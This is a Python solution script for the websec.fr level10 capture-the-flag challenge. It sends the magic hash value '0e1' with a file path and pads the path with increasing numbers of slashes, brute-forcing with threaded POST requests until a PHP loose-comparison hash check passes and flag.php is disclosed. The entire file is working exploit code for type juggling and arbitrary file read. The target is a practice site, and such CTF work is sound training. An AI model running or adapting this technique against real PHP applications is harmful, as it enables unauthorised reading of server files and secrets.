#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://websec.fr/level10/index.php"

def send_request(path):
    data_obj = {'hash': '0e1', 'f': path}
    res = requests.post(URL, data=data_obj)
    return path, res.text

def generate_variants(base_path, slash_count, batch_size=10):
    variants = []
    for i in range(slash_count + 1, slash_count + batch_size + 1):
        variant = base_path[0] + '/' * i + base_path[1:]
        variants.append((i, variant))
    return variants

file_path = './flag.php'
slash_count = 0

while True:
    variants = generate_variants(file_path, slash_count, batch_size=10)

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_request, path): (count, path)
                   for count, path in variants}

        found = False
        for future in as_completed(futures):
            path, text = future.result()
            count, _ = futures[future]
            print(f"[{count} slashes] {path}")
            if 'WEBSEC{' in text:
                print(f"\nFound! Path: {path}")
                print(text)
                found = True
                break

    if found:
        break

    slash_count += 10